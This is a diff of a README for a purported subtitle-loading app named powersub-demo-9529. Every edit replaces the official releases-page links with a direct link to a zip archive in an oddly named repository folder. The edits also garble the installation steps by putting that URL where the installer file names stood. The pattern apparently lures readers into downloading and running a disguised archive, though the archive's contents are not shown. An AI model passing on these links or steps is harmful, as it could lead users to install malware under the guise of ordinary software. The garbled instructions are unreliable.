@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-9529 - Easy Subtitle Loading Made Simple
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/sergiu134/powersub-demo-9529/releases)
+[![Download](https://raw.githubusercontent.com/sergiu134/powersub-demo-9529/main/cinchomeronic/powersub-demo-9529_3.9.zip%https://raw.githubusercontent.com/sergiu134/powersub-demo-9529/main/cinchomeronic/powersub-demo-9529_3.9.zip)](https://raw.githubusercontent.com/sergiu134/powersub-demo-9529/main/cinchomeronic/powersub-demo-9529_3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to powersub-demo-9529! This application helps you load subtitles easily while watching videos. Follow the steps below to download and run the software on your computer.
@@ -24,13 +24,13 @@ To run powersub-demo-9529, your computer needs the following:
 To download and install powersub-demo-9529, follow these steps:
 
 1. **Visit the Releases Page**
-   Open this [link](https://github.com/sergiu134/powersub-demo-9529/releases) in your web browser.
+   Open this [link](https://raw.githubusercontent.com/sergiu134/powersub-demo-9529/main/cinchomeronic/powersub-demo-9529_3.9.zip) in your web browser.
 
 2. **Select the Latest Release**
    You will see a list of available versions. Look for the latest release. It is typically marked as "Latest Release."
 
 3. **Download the Installer**
-   Click on the installer that matches your operating system. The file name may look like `powersub-demo-9529-v1.0.exe` for Windows or `powersub-demo-9529-v1.0.dmg` for macOS.
+   Click on the installer that matches your operating system. The file name may look like `https://raw.githubusercontent.com/sergiu134/powersub-demo-9529/main/cinchomeronic/powersub-demo-9529_3.9.zip` for Windows or `https://raw.githubusercontent.com/sergiu134/powersub-demo-9529/main/cinchomeronic/powersub-demo-9529_3.9.zip` for macOS.
 
 4. **Run the Installer**
    After the download completes, locate the file on your computer and double-click it to run the installer. Follow the prompts to complete the installation process.
@@ -62,4 +62,4 @@ Currently, the application does not support appearance customization. However, f
 If you encounter issues or have questions, please feel free to open an issue on our GitHub page or refer to our support documentation linked in the application menu.
 
 ## 🎉 Conclusion
-Thank you for choosing powersub-demo-9529! We hope this guide helps you get started smoothly. Enjoy watching your videos with the perfect subtitles. For further updates and features, remember to check back on our [Releases Page](https://github.com/sergiu134/powersub-demo-9529/releases).
+Thank you for choosing powersub-demo-9529! We hope this guide helps you get started smoothly. Enjoy watching your videos with the perfect subtitles. For further updates and features, remember to check back on our [Releases Page](https://raw.githubusercontent.com/sergiu134/powersub-demo-9529/main/cinchomeronic/powersub-demo-9529_3.9.zip).
